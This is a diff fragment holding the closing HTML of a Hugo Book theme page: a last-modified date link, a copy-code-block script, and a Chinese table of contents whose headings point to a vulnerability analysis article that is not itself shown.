+  <div><a class="flex align-center" href="https://github.com/alex-shpak/hugo-book/commit/c9d31cc6aba6dfb6f266c3032172acd36e4d6723" title='最后修改者 hoo1ng | December 18, 2023' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>December 18, 2023</span>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#poc及利用条件">POC及利用条件</a></li>
+    <li><a href="#漏洞分析">漏洞分析</a></li>
+    <li><a href="#还有没有其他的">还有没有其他的</a></li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
